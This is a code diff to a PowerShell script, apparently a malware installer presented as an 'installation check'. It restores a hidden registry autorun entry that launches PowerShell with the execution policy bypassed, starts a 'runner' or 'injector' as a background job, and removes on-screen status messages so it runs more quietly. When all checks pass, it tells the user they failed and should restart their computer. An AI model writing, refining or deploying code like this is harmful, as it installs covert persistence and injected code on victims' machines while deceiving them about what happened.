@@ -94,11 +94,9 @@ function fixRun {
         $cmd = "powershell -w h -ep bypass -f `"$rf`""
         Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
         lInfo "Autorun fixed" @{ name = $n; command = $cmd }
-        Write-Host "  [✓] Autorun restored" -ForegroundColor Green
         return $true
     } catch {
         lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
-        
         return $false
     }
 }
@@ -107,25 +105,18 @@ function startRun {
     param([string]$rf)
     if (!(Test-Path $rf)) {
         lErr "Runner file not found, cannot start"
-        
         return $false
     }
     
     try {
         $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
         $scriptBlock = [ScriptBlock]::Create($scriptContent)
-        
         Start-Job -ScriptBlock $scriptBlock | Out-Null
-        
         lInfo "Runner started manually" @{ path = $rf }
-        
-        
         Start-Sleep -Seconds 2
-        
         return $true
     } catch {
         lErr "Failed to start runner" @{ error = $_.Exception.Message }
-        Write-Host "  [✗] Failed to start injector" -ForegroundColor Red
         return $false
     }
 }
@@ -185,15 +176,11 @@ function chk {
     $needsRepair = $false
     
     if (-not $r.ar -and $r.rf) {
-        Write-Host ""
-        
         $r.ar = fixRun -n $aName -rf $rFile
         $needsRepair = $true
     }
     
     if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
-        Write-Host ""
-        
         if (startRun -rf $rFile) {
             Start-Sleep -Seconds 3
             $r.pr = tProc -pn $pName
@@ -216,7 +203,7 @@ function chk {
     Write-Host ""
     
     if ($pc -eq $tc) {
-        Write-Host "  [!] You did not pass the checking! Restart your computer.: $pc/$tc ($pp%)" -ForegroundColor Red
+        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
         lInfo "Installation check completed" @{
             passed = $pc
             total = $tc
@@ -227,7 +214,7 @@ function chk {
     } elseif ($pc -ge 4) {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
         Write-Host ""
-        
+        lInfo "Installation check completed with warnings" @{
             passed = $pc
             total = $tc
             percentage = $pp
@@ -237,6 +224,7 @@ function chk {
     } else {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
         Write-Host ""
+        lErr "Installation check failed" @{
             passed = $pc
             total = $tc
             percentage = $pp
